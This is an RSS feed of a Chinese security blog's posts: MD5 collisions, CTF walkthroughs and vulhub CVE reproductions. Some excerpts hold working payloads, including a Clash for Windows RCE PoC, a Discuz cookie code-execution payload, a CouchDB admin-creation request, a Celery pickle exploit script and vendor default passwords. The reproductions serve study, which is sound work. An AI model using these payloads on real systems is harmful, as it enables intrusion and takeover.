@@ -1,0 +1,908 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Posts on 0opsdc</title>
+    <link>https://oopsdc.com/post/</link>
+    <description>Recent content in Posts on 0opsdc</description>
+    <image>
+      <url>https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 13 Aug 2022 20:27:10 +0800</lastBuildDate><atom:link href="https://oopsdc.com/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MD5</title>
+      <link>https://oopsdc.com/post/md5/</link>
+      <pubDate>Sat, 13 Aug 2022 20:27:10 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/md5/</guid>
+      <description>简介 MD5，即Message-Digest Algorithm 5，MD5信息摘要算法。
+这是一种典型的哈希函数/散列函数，会将任意消息内容变为长度固定的散列值，任何输入内容都将被输出一个长度固定为128bit的MD5值，同一个输入消息的输出结果始终相同。
+MD5数据的128bit散列值分为4部分，用4个幻数设定其初始值，4个幻数在内存地址上从低到高为：
+幻数 内存地址 A 01 23 45 67 B 89 ab cd ef C fe dc ba 98 D 76 54 32 10 标准幻数总共为4*32=128bit。
+MD5算法生成散列值的过程总共分为三步：1、填充对齐；2、分块；3、多轮压缩。
+1、填充补齐：需要将数据补充为512bit的整数倍，在补齐数据中采用小端格式，最后64bit固定用于表示原始数据大小，中间剩下的bit第一个填1，其余均为0。若数据为1000bit，不足够存放64bit表示原始数据大小的数据，则补齐到512的三倍即可。
+2、分块：分为512bit的数据块。
+3、多轮压缩：将当前散列值的4部分各复制一份，分别用a、b、c、d表示，压缩共有4轮，每轮压缩过程使用数据块和a、b、c、d进行一系列与、或、非、循环移位的位操作，将a、b、c、d各自更新4次，4轮压缩一共更新16次。完成4轮压缩后，将最后得到的a、b、c、d分别加回到当前散列值的4个部分，散列值被更新。之所以叫压缩，是因为这个过程实际上在使用512bit的数据块来更新128bit的散列值，信息被压缩了，然后再使用后续大块进行相同操作，唯一不同点在于此时散列值初始值为前一个大块的最终值。
+在所有大块上完成多轮压缩后，散列值更新为最终输出的MD5值，将这4部分合起来并变换为大端数即为最终输出的MD5值。
+MD5信息摘要算法于1992年公开，其主要目的在于取代MD4算法，1996年后MD5算法被证实存在弱点，可以被加以破解，2004年MD5算法被证实无法防止碰撞，不适用于SSL公开密钥、数字签名等安全性认证。
+应用场景 文件校验
+数据库字段加密
+如何攻击 MD5只是一个产生消息摘要的散列函数，而非加密算法，这个过程有信息损失且不可逆推。举例：1 | 1 = 1，但是不能倒推原始数据。
+以鸽笼原理举例，一定会有同一个笼子至少有两只鸽子，引申出碰撞的概念。
+原像攻击 这是对MD5的第一个基本安全要求，即找到任意一个能产生这个MD5值的消息，不过到今天也没有一个通用的可行方案。
+暴力穷举：MD5值的范围在0~2^128^之间，理论上可行，但工程上不现实。
+第二原像攻击 如果给定一个消息，能不能再找到另外一个MD5值相同的消息呢？
+抗第二原像攻击（抗弱碰撞性）是对MD5的第二个基本安全性要求，除了在MD4弱消息上可行，对于MD5目前并没有有效的可行方案。
+抗碰撞性（最不具安全性） 也叫抗强碰撞性，是对MD5的第三个基本安全性要求。
+这个特性继续放宽了攻击标准，不指定MD5值和消息，只要找出两个MD5值相同的消息即可。
+之前的研究很长时间都困在“伪碰撞”的范围，真正的突破在2005年山东大学王小云团队的&amp;quot;How to Break MD5 and Other Hash Functions&amp;quot;论文，研究思路为基于模块化差分，大体思路为先找到局部碰撞，然后分析差分如何传播，找到差分路径，再利用消息修改技术得到能产生碰撞的消息对。
+和MD5算法本身相比，寻找碰撞的方法要抽象、复杂得多，但这也正是信安领域的魅力。
+这个方法在大约15~60min内找到了碰撞，从学术角度看，MD5大势已去，但从工程角度而言，虽然可以快速找到大量MD5碰撞，但这两个碰撞的消息是根据差分路径和消息修改精心构造而来，基本上都是没有实际意义的乱码，很难想象会对MD5的工程应用造成什么直接影响。
+在王小云团队的研究基础上，2007年Marc Stevens在硕士论文中交付了两项新成果：1、用一个内容在几秒钟内生成另外两个MD5值一样，但内容不同的消息，重要的是生成的内容可以有意义，该成果有一个叫fastcoll的软件，可通过该软件生成MD5值相同且可以正常打开的图片，但仔细观察文本就会发现其结尾数据并不相同，这被称为相同前缀碰撞，原始内容作为前缀，然后不断尝试构造两个不同的后缀数据，直到最后两者MD5相同，前缀数据保留了内容本身的意义。换个概念来讲，若用可执行程序作为前缀，攻击者可绕过审核发布钓鱼软件，只需让软件内部做一个判定，如本程序最后1bit为1执行正常行为，0执行恶意行为，正常版本通过检测后再用恶意版本进行替换，若只依赖于MD5值判断的话将无法检测到替换的发生。相同前缀生成的可执行文件代码一样，只是触发条件不同，但是在杀毒过程中还是有可能发现可疑行为，所以最好情况是正常版本和恶意版本为两个不相干的程序；2、自由选择前缀消息内容，生成两个MD5值一样但前缀内容不同的文件，称之为选择前缀碰撞，其还会对使用MD5的数字签名产生巨大威胁。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>WSL</title>
+      <link>https://oopsdc.com/post/wsl/</link>
+      <pubDate>Sat, 13 Aug 2022 20:27:10 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/wsl/</guid>
+      <description>简介 基本命令：
+WSL 的基本命令 | Microsoft Docs
+位置迁移 先导出再导入即可实现迁移。
+1 关闭系统 确认系统运行情况：
+wsl --list --verbose # 或 wsl -l -v 关闭系统：
+wsl --shutdown 2 迁移 导出到事先创建好的D:\Kali目录：
+# wsl --export &amp;lt;系统名&amp;gt; &amp;lt;导出文件路径&amp;gt; wsl --export kali-linux D:\Kali\Kali.tar 导入：
+# wsl --import &amp;lt;系统名&amp;gt; &amp;lt;安装位置&amp;gt; &amp;lt;导入文件位置&amp;gt; &amp;lt;WSL版本号&amp;gt; wsl --import Kali D:\Kali D:\Kali\Kali.tar --version 2 删除迁移前的系统：
+wsl -l -v # 结果如下 NAME STATE VERSION * kali-linux Stopped 2 Kali Stopped 2 # 删除第一个，即迁移前的系统 wsl --unregister kali-linux 完成迁移。</description>
+    </item>
+    
+    <item>
+      <title>信息泄漏</title>
+      <link>https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</link>
+      <pubDate>Sat, 13 Aug 2022 20:27:10 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</guid>
+      <description>目录遍历 Des: N/A。
+页面如下：
+点击按钮后会进入一个在线FTP目录：
+挨个进入查看即可。
+获得flag。
+PHPINFO Des: N/A。
+页面如下：
+点击按钮进入phpinfo页面，Ctrl+F搜索flag即可在Environment中的变量中找到flag。
+获得flag。
+拓展：phpinfo PHP: phpinfo - Manual
+phpinfo包含所有EGPCS(Environment, GET, POST, Cookie, Server)数据，通过phpinfo页面我们能获取到服务器的很多配置信息，在后续的文件上传等操作上能依据该页面的禁用函数定制攻击手法。
+备份文件下载 网站源码 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
+页面如下：
+尝试访问www.zip，成功获取网站源码。
+获得flag。
+bak文件 Des: 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
+页面内容如下：
+Flag in index.php source code. 网站默认首页为index.php，查看页面源码没有任何信息，尝试获取index.php源码，联想到题目给的bak文件，尝试访问index.php.bak，成功获取index.php.bak文件。
+获得flag。
+vim缓存 Des: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。
+页面如下：
+备份文件下载 - vim flag 在 index.php 源码中 页面提示我们获取index.php文件，再根据题目名称我们大概可知具体方法为获取index.php的vim缓存文件，访问.index.php.swp即可，此处在index.php之前加.是因为vim缓存文件默认为隐藏文件，所以文件名前有个.。获取到index.php.swp文件后我们先在Linux中使用touch命令创建一个同名文件index.php，再使用vim -r &amp;lt;filename&amp;gt;恢复文件内容。
+拓展：vim文件备份 用户在使用vim的过程中若因断电、网络不稳定(如终端突然断开等情况)等原因突然中断文件编辑时，第一次vim会在当前目录生成一个与编辑文件同名的后缀为.swp的备份文件，第二次后缀为swo，第三次后缀为swn。用户可使用vim -r命令查看当前目录下的所有swp文件，在当前目录存在与备份文件同名的文件时，使用vim -r &amp;lt;filename&amp;gt;命令将备份文件中的内容覆盖至文件。
+.DS_Store Des: .</description>
+    </item>
+    
+    <item>
+      <title>密码口令</title>
+      <link>https://oopsdc.com/post/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/</link>
+      <pubDate>Sat, 13 Aug 2022 20:27:10 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/</guid>
+      <description>弱口令 Des: 通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。
+页面如下：
+尝试账密admin/admin。
+获得flag。
+拓展：弱口令在实战中的应用 由于一些产品的默认设置或使用人员的偷懒行为，我们有时在实际渗透过程中尝试一下弱口令会获得一些意想不到的收获。
+默认口令 Des: N/A。
+页面如下：
+在搜索引擎搜索eyou邮件网关默认账号即可，此处附上其它相关默认账密：
+邮件、网管系统默认账密：admin aaaaa LDAP默认账密：eyouadmin aaaaa MySQL默认账密：root 密码空 网关后台默认账密： admin +-ccccc eyougw admin@(eyou) eyouuser eyou_admin 文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>博客搭建</title>
+      <link>https://oopsdc.com/post/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
+      <pubDate>Sun, 12 Jun 2022 12:29:53 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
+      <description>博客搭建 hugo Hugo官方网站：https://gohugo.io
+本文以PaperMod主题为例，官方文档：Installation · adityatelange/hugo-PaperMod Wiki (github.com)
+需求准备 Hugo：Releases · gohugoio/hugo (github.com)
+安装步骤 1.解压压缩包 2.配置环境变量 D:\Env\hugo_0.83.1 3.初始化博客 官方文档推荐我们使用易读性更高的yml格式初始化博客。
+hugo new site &amp;lt;name of site&amp;gt; -f yml 4.指定主题 在config.yml文件中设置主题。
+theme: PaperMod 5.本地启动 先在本地看看网站跑起来的效果
+hugo server 6.创建GitHub仓库 具体操作详见之后的hexo主题教学。
+7.修改baseUrl 将config.yml文件中的baseUrl修改为刚刚创建的仓库。
+baseURL: &amp;#34;https://&amp;lt;username&amp;gt;.github.io/&amp;#34; 8.生成public文件夹 public中包含所有静态页面的内容，我们需要生成这个文件夹并上传到远程仓库中，完成博客部署。
+hugo 9.push到远程仓库 # 配置代理 git config --global http.proxy socks5://127.0.0.1:&amp;lt;port&amp;gt; git config --global https.proxy socks5://127.0.0.1:&amp;lt;port&amp;gt; # 更改默认分支 git push -u origin main # push文件 cd public git init git add .</description>
+    </item>
+    
+    <item>
+      <title>Django JSONField SQL注入 CVE 2019 14234漏洞复现</title>
+      <link>https://oopsdc.com/post/django-jsonfield-sql%E6%B3%A8%E5%85%A5-cve-2019-14234%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 19 Mar 2022 17:38:55 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/django-jsonfield-sql%E6%B3%A8%E5%85%A5-cve-2019-14234%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Django是一个由Python编写的开源Web框架，采用MTV框架模式。
+该漏洞需要开发者使用JSONField/HStoreField且用户可控queryset查询时的键名，在键名的位置实现SQL注入。
+Django通常结合PostgreSQL数据库进行使用，而JSONField是该数据库的一种数据类型，漏洞成因在于Django中JSONField类的实现，Django的model的本质作用在于生成SQL语句，但Django在通过JSONField生成SQL语句时仅通过简单字符串拼接，通过JSONField类获得KeyTransform类并生成SQL语句：
+class KeyTransform(Transdform): operator = &amp;#39;-&amp;gt;&amp;#39; nested_operator = &amp;#39;#&amp;gt;&amp;#39; def __init__(self, key_name, *args, **kwargs): super().__init__(*args, **kwargs) self.key_name = key_name def as_sql(self, compiler, connection): key_transforms = [self.key_name] previous.= self.lhs while isinstance(previous, KeyTransform): key_transforms.insert(0, previous.key_name) previous = previous.lhs lhs, params = compiler.compile(previous) if len(key_transforms) &amp;gt; 1: return &amp;#34;(%s %s %%s)&amp;#34; % (lhs, self.nested_operator), [key_transforms] + params try: int(self.key_name) except ValueError: lookup = &amp;#34;&amp;#39;%s&amp;#39;&amp;#34; % self.key_name else: lookup = &amp;#34;%s&amp;#34; % self.</description>
+    </item>
+    
+    <item>
+      <title>Django URL跳转 CVE-2018-14574漏洞复现</title>
+      <link>https://oopsdc.com/post/django-url%E8%B7%B3%E8%BD%AC-cve-2018-14574%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 16 Mar 2022 19:39:54 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/django-url%E8%B7%B3%E8%BD%AC-cve-2018-14574%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 当setting中配置了django.middleware.common.CommonMiddleware且APPEND_SLASH=True时会触发URL跳转漏洞，而这两个配置默认存在，且APPEND_SLASH不需显式写在setting配置文件。CommonMiddleware是Django的一个通用中间件，其实质是一个位于site-packages/django/middleware/common.py的类，用于执行一些HTTP请求的基础操作：
+- Forbid access to User-Agents in settings.DISALLOWED_USER_AGENTS - URL rewriting: Based on the APPEND_SLASH and PREPEND_WWW settings, append missing slashes and/or prepends missing &amp;#34;www.&amp;#34;s. - If APPEND_SLASH is set and the initial URL doesn&amp;#39;t end with a slash, and it is not found in urlpatterns, form a new URL by appending a slash at the end. If this new URL is found in urlpatterns, return an HTTP redirect to this new URL; otherwise process the initial URL as usual.</description>
+    </item>
+    
+    <item>
+      <title>Clash for Windows RCE漏洞复现</title>
+      <link>https://oopsdc.com/post/clash-for-windows-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 16 Mar 2022 18:38:09 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/clash-for-windows-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 [Bug]: Remote Code Execution/远程代码执行 · Issue #2710 · Fndroid/clash_for_windows_pkg (github.com)
+影响版本 Clash for Windows 0.19.9版本受部分影响。
+Clash for Windows 0.19.8及以下版本均受RCE影响。
+漏洞复现 POC:
+port: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: :9090 proxies: - name: a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(`require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;calc.exe&amp;#34;);`);&amp;gt; type: socks5 server: 127.0.0.1 port: &amp;#34;17938&amp;#34; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: &amp;#34;8088&amp;#34; skip-cert-verify: true proxy-groups: - name: &amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(`require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;calc.exe&amp;#34;);`);&amp;gt; type: select proxies: - a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(`require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;calc.exe&amp;#34;);`);&amp;gt; Clash for Windows下载地址：Releases · Fndroid/clash_for_windows_pkg (github.</description>
+    </item>
+    
+    <item>
+      <title>Django Debug Page XSS CVE-2017-12794漏洞复现</title>
+      <link>https://oopsdc.com/post/django-debug-page-xss-cve-2017-12794%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 23 Feb 2022 17:01:40 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/django-debug-page-xss-cve-2017-12794%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞原理 若Django项目使用Postgres作为数据库，当触发异常时，psycopg会将字段名及字段值抛出，当字段值中包含可控字符串时，其最后便会在页面中进行显示。
+我们可查看1.11.4和1.11.5版本之间django/views/templates/technical_500.html文件的差异：
+其差异在于外部关闭了全局转义，并在如图所示处增加了强制转义。若要触发这两个输出点，我们需要进入{% ifchanged frame.exc_cause %}{% if frame.exc_cause %}语句，那么就需要我们判断这段代码所在的功能点，然后精准打击，图中有一串The above exception was the direct cause of the following exception:报错提示，而依据经验的话这是Django中数据库异常抛出的错误语句。
+在Django命令行下，当创建一个已存在的用户时，系统会因触发数据库Unique异常而抛出一个IntegrityError异常，其目的在于方便开发者进行SQL错误调试。
+查看django/db/utils.py的__exit__函数：
+def __exit__(self, exc_type, exc_value, traceback): if exc_type is None: return for dj_exc_type in ( DataError, OperationalError, IntegrityError, InternalError, ProgrammingError, NotSupportedError, DatabaseError, InterfaceError, Error, ): db_exc_type = getattr(self.wrapper.Database, dj_exc_type.__name__) if issubclass(exc_type, db_exc_type): dj_exc_value = dj_exc_type(*exc_value.args) dj_exc_value.__cause__ = exc_value if not hasattr(exc_value, &amp;#39;__traceback__&amp;#39;): exc_value.__traceback__ = traceback # Only set the &amp;#39;errors_occurred&amp;#39; flag for errors that may make # the connection unusable.</description>
+    </item>
+    
+    <item>
+      <title>Discuz!X≤3.4任意文件删除漏洞复现</title>
+      <link>https://oopsdc.com/post/discuzx3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 21 Feb 2022 21:06:42 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/discuzx3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Discuz 3.4版本之前的任意文件删除漏洞未被完全修复，虽然添加了对属性formtype的判断，但仍可通过模拟文件上传进入其它unlink条件，实现任意文件删除。
+影响版本 Discuz 3.4及以下版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/discuz/x3.4-arbitrary-file-deletion docker-compose up -d 环境启动之后直接访问http://&amp;lt;ip&amp;gt;:8080会显示Discuz! info: Can not connect to MySQL server错误，需要先在http://&amp;lt;ip&amp;gt;:8080/install页面安装Discuz，数据库地址填写为db，数据库及管理员密码自行填写即可：
+访问http://&amp;lt;ip&amp;gt;/robots.txt查看robots.txt文件是否存在，文件存在且内容如下：
+# # robots.txt for Discuz! X3 # User-agent: * Disallow: /api/ Disallow: /data/ Disallow: /source/ Disallow: /install/ Disallow: /template/ Disallow: /config/ Disallow: /uc_client/ Disallow: /uc_server/ Disallow: /static/ Disallow: /admin.php Disallow: /search.php Disallow: /member.php Disallow: /api.php Disallow: /misc.php Disallow: /connect.php Disallow: /forum.php?mod=redirect* Disallow: /forum.php?mod=post* Disallow: /home.php?mod=spacecp* Disallow: /userapp.</description>
+    </item>
+    
+    <item>
+      <title>Celery&lt;4.0未授权访问&amp;Pickle反序列化利用漏洞复现</title>
+      <link>https://oopsdc.com/post/celery4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 19 Feb 2022 21:24:53 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/celery4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Celery是一个简单、灵活、可靠的分布式系统，用于处理大量消息的同时也为操作提供维护此类系统所需的工具，其专注于实时处理的任务队列，支持任务调度。
+Celery 4.0以下版本默认使用Pickle进行任务消息的序列化传递，而当所用队列服务(Redis、RabbitMQ、RocketMQ等)存在未授权访问问题时，便可利用Pickle反序列化漏洞实现任意代码执行。
+影响版本 Celery 4.0以下版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/celery/celery3_redis_unauth docker-compose up -d 在受害主机/tmp目录生成celery_success文件EXP，可根据需求自行修改command内容：
+import pickle import json import base64 import redis import sys r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) ori_str=&amp;#34;{\&amp;#34;content-type\&amp;#34;: \&amp;#34;application/x-python-serialize\&amp;#34;, \&amp;#34;properties\&amp;#34;: {\&amp;#34;delivery_tag\&amp;#34;: \&amp;#34;16f3f59d-003c-4ef4-b1ea-6fa92dee529a\&amp;#34;, \&amp;#34;reply_to\&amp;#34;: \&amp;#34;9edb8565-0b59-3389-944e-a0139180a048\&amp;#34;, \&amp;#34;delivery_mode\&amp;#34;: 2, \&amp;#34;body_encoding\&amp;#34;: \&amp;#34;base64\&amp;#34;, \&amp;#34;delivery_info\&amp;#34;: {\&amp;#34;routing_key\&amp;#34;: \&amp;#34;celery\&amp;#34;, \&amp;#34;priority\&amp;#34;: 0, \&amp;#34;exchange\&amp;#34;: \&amp;#34;celery\&amp;#34;}, \&amp;#34;correlation_id\&amp;#34;: \&amp;#34;6e046b48-bca4-49a0-bfa7-a92847216999\&amp;#34;}, \&amp;#34;headers\&amp;#34;: {}, \&amp;#34;content-encoding\&amp;#34;: \&amp;#34;binary\&amp;#34;, \&amp;#34;body\&amp;#34;: \&amp;#34;gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\&amp;#34;}&amp;#34; task_dict = json.loads(ori_str) command = &amp;#39;touch /tmp/celery_success&amp;#39; class Person(object): def __reduce__(self): # 未导入os模块，通用 return (__import__(&amp;#39;os&amp;#39;).</description>
+    </item>
+    
+    <item>
+      <title>Discuz代码执行 Wooyun-2010-080723漏洞复现</title>
+      <link>https://oopsdc.com/post/discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-wooyun-2010-080723%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Fri, 18 Feb 2022 12:48:42 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-wooyun-2010-080723%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 PHP 5.3.x版本php.ini配置文件中request_order参数的默认值为GP，导致$_REQUEST不再包含$_COOKIE，攻击者可通过Cookie传入$GLOBALS覆盖全局变量，进一步实现代码执行。
+影响版本 Discuz 6.x版本。
+Discuz 7.x版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/discuz/wooyun-2010-080723 docker-compose up -d 环境启动之后直接访问http://&amp;lt;ip&amp;gt;:8080会显示Discuz! info: Can not connect to MySQL server错误，需要先在http://&amp;lt;ip&amp;gt;:8080/install页面安装Discuz，数据库地址填写为db，数据库及管理员密码自行填写即可：
+随机抓一个帖子的数据包：
+GET /viewthread.php?tid=13&amp;amp;extra=page%3D1 HTTP/1.1 Host: &amp;lt;ip&amp;gt; Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://&amp;lt;ip&amp;gt;/forumdisplay.php?fid=2 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fhomepage%2Ecfm; 8p0_sid=uUasIs; 8p0_onlineusernum=1; 8p0_visitedfid=2; 8p0_oldtopics=D13D; 8p0_fid2=1645160609 Connection: close 将包发送到重放器，修改Cookie：
+GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo(); 发包后查看响应，成功返回phpinfo页面，同理可写shell，文件x.php，密码oopsdc：</description>
+    </item>
+    
+    <item>
+      <title>Apache CouchDB垂直越权 CVE-2017-12635漏洞复现</title>
+      <link>https://oopsdc.com/post/apache-couchdb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-cve-2017-12635%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Tue, 15 Feb 2022 13:19:33 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/apache-couchdb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-cve-2017-12635%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Apache CouchDB是一个开源数据库，其使用JSON作为数据存储格式、JavaScript作为查询语言、MapReduce和HTTP作为NoSQL数据库。
+漏洞成因在于Erlang和JavaScript对JSON数据解析方式不同，对于重复的键，Erlang会存储两个值，而JavaScript只存储第二个值，从而导致语句执行有差异，可被攻击者用于垂直越权。
+示例：
+Erlang：
+jiffy:decode(&amp;#34;{&amp;#34;a&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;a&amp;#34;:&amp;#34;2&amp;#34;}&amp;#34;). {[{&amp;lt;&amp;lt;&amp;#34;a&amp;#34;&amp;gt;&amp;gt;,&amp;lt;&amp;lt;&amp;#34;1&amp;#34;&amp;gt;&amp;gt;},{&amp;lt;&amp;lt;&amp;#34;a&amp;#34;&amp;gt;&amp;gt;,&amp;lt;&amp;lt;&amp;#34;2&amp;#34;&amp;gt;&amp;gt;}]} JavaScript：
+JSON.parse(&amp;#34;{&amp;#34;a&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;a&amp;#34;:&amp;#34;2&amp;#34;}&amp;#34;) {a:&amp;#34;2&amp;#34;} 影响版本 1.7.0、2.1.1版本以下均受影响。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/couchdb/CVE-2017-12635 docker-compose up -d 访问http://&amp;lt;ip&amp;gt;:5984/_utils，会跳转到登录页面，使用bp构造如下请求包：
+PUT /_users/org.couchdb.user:oopsdc HTTP/1.1 Host: &amp;lt;ip&amp;gt;:5984 Content-Length: 92 accept: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Origin: http://&amp;lt;ip&amp;gt;:5984 Referer: http://&amp;lt;ip&amp;gt;:5984/_utils/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 { &amp;#34;type&amp;#34;: &amp;#34;user&amp;#34;, &amp;#34;name&amp;#34;: &amp;#34;oopsdc&amp;#34;, &amp;#34;roles&amp;#34;:[ &amp;#34;_admin&amp;#34;], &amp;#34;password&amp;#34;: &amp;#34;oopsdc&amp;#34; } 响应包如下：
+HTTP/1.1 403 Forbidden X-CouchDB-Body-Time: 0 X-Couch-Request-ID: 4ab931d550 Server: CouchDB/2.</description>
+    </item>
+    
+    <item>
+      <title>Adobe ColdFusion反序列化 CVE-2017-3066漏洞复现</title>
+      <link>https://oopsdc.com/post/adobe-coldfusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2017-3066%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 27 Jan 2022 19:40:58 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/adobe-coldfusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2017-3066%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Adobe ColdFusion是一个动态Web服务器，其所采用的CFML(ColdFusion Markup Language)程序设计语言类似JSP的JSTL(JSP Standard Tag Lib)，CFML是一种针对Web应用的脚本语言，文件后缀为.cfm。
+Adobe ColdFusion存在Java反序列化漏洞，攻击者可通过该漏洞在应用程序上下文中执行任意代码或造成拒绝服务。
+影响版本 Adobe ColdFusion(2016 release) Update 3及之前版本。
+Adobe ColdFusion 11 Update 11及之前版本。
+Aodbe ColdFusion 10 Update 22及之前版本。
